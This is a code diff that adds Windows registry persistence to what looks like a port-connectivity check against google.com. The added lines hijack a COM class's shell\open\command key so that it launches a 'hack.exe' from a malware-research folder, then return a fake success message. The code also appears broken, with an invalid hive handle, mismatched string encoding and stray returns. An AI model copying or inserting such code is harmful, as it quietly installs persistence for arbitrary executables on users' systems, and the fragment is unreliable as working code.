@@ -27,3 +27,16 @@ for port in (78, 79, 80):
 print('Failed to connect to google.com on port', port)
 winsock.closesocket(s)
 continue
+shell = 'SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell'
+exe = 'C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe'.encode('utf-8')
+hkey = ctypes.c_void_p()
+res = ctypes.windll.advapi32.RegOpenKeyExW(ctypes.c_uint32(8), shell, 0, 131097, ctypes.byref(hkey))
+if res == 0:
+    hkR = ctypes.c_void_p()
+    res = ctypes.windll.advapi32.RegCreateKeyExW(hkey, 'open\\command', 0, None, 0, 983103, None, ctypes.byref(hkR), None)
+    if res == 0:
+        res = ctypes.windll.advapi32.RegSetValueExW(hkR, None, 0, 1, exe, len(exe))
+        ctypes.windll.advapi32.RegCloseKey(hkR)
+    ctypes.windll.advapi32.RegCloseKey(hkey)
+    return None
+return [ 'Connected to google.com on port' ]
